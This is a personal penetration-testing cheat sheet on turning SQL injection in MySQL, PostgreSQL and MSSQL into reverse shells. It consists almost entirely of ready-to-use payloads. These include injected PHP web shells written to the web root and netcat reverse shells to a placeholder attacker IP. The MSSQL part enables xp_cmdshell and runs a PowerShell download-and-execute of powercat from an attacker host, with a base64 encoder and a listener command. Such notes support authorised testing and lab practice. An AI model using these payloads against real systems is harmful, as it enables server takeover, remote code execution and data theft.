---
note_tags:
  - xp_cmdshell
  - mssql
  - payload
  - foothold
  - mysql
  - rce
---
# SQL reverse shells

**Author:** Julien Bongars\
**Date:** 2025-09-20 17:19:28
**Path:**

---

Reverse shell for SQL commands

## MySQL

```sql
' UNION SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php'--

# Direct Shell
' UNION SELECT sys_exec('nc -e /bin/bash YOUR_IP 4444')--
```

## Postgresql

```sql
'; COPY (SELECT '<?php system($_GET["cmd"]); ?>') TO '/var/www/html/shell.php'--

# Using extensions (if enabled):
'; CREATE OR REPLACE FUNCTION system(cstring) RETURNS int AS '/lib/libc.so.6', 'system' LANGUAGE 'c' STRICT--
'; SELECT system('nc -e /bin/bash YOUR_IP 4444')--

# use the program arg
' UNION SELECT 1; COPY (SELECT '') FROM PROGRAM 'nc -e /bin/bash YOUR_IP 4444'; --
```

### Additional cracks by col

## MSSQL

```sql
EXEC sp_configure 'show advanced options', '1';
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', '1' ;
RECONFIGURE ;
WAITFOR DELAY '00:00:03';

EXEC sp_configure 'show advanced options', '1'; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', '1' ; RECONFIGURE ; WAITFOR DELAY '00:00:03'

-- option 1
EXEC xp_cmdshell 'powershell -c "iex(new-object net.webclient).downloadstring(''http://YOUR_IP/shell.ps1'')"'--

-- option 2
-- get base64 from revshells.com
EXEC xp_cmdshell 'powershell -e <BASE64>';
```

### Payload

```ps1
iex (New-Object Net.WebClient).DownloadString('http://<ATTACKER_IP>/powercat.ps1'); powercat -c <ATTACKER_IP> -p 4444 -e cmd

# Generate the payload on attacker box
$cmd = "iex (New-Object Net.WebClient).DownloadString('http://<ATTACKER_IP>/powercat.ps1'); powercat -c <ATTACKER_IP> -p 4444 -e cmd"
$bytes = [System.Text.Encoding]::Unicode.GetBytes($cmd)
[Convert]::ToBase64String($bytes)
```

### Attacker

```ps1
# Need to use powercat on attack machine to get shell
powercat -l -p 4444 -e cmd
```

## Resources

- [revshells.com](https://www.revshells.com/) — MSSQL note says get base64 from here
- [powercat](https://github.com/besimorhino/powercat) — listener used in the MSSQL payload
- [MySQL](../../enumeration/sql/mysql.md) — client + FILE / INTO OUTFILE
- [MSSQL enumeration](../../enumeration/sql/MSSQL/main.md) — xp_cmdshell from a client
- [MSSQL linked servers](../../enumeration/sql/MSSQL/sp-linked-server.md)
- [Manual SQLi](../../enumeration/sql/manual.md) — quote / delay / UNION
- [sqlmap](../../enumeration/sql/sqlmap.md) — `--os-shell` when HTTP-injectable
- [Identify SQL engine](../../enumeration/sql/identify-sql-engine.md)
